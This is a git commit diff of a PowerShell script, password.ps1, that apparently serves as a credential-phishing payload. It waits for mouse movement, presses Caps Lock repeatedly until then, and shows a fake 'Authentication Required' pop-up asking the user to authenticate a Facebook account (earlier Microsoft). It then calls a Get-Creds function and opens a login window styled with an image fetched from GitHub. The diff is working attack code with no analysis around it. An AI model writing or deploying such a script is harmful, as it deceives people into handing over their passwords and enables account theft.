da0eafa2238b6f158dc810e1545c4359bd715ec1
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-07 12:24:02 -0600

    Update password.ps1

--- password.ps1
+++ password.ps1
@@ -1,5 +1,71 @@
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
+
+
+
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+}
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+
+Caps-Off
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Please authenticate your Facebook Account."
+$msgTitle = "Authentication Required"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
+
+$creds = Get-Creds
+
+
 # Define the URL to the image hosted on GitHub
 $imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
 
@@ -76,70 +142,6 @@ $loginButton.Add_Click({
 
 # Show the login window
 $loginWindow.ShowDialog()
-
-
-
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-}
-
-#----------------------------------------------------------------------------------------------------
-
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
-function Caps-Off {
-Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
-
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
-}
-}
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
-
-Pause-Script
-
-Caps-Off
-
-Add-Type -AssemblyName PresentationCore,PresentationFramework
-$msgBody = "Please authenticate your Microsoft Account."
-$msgTitle = "Authentication Required"
-$msgButton = 'Ok'
-$msgImage = 'Warning'
-$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-Write-Host "The user clicked: $Result"
-
-$creds = Get-Creds
-
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
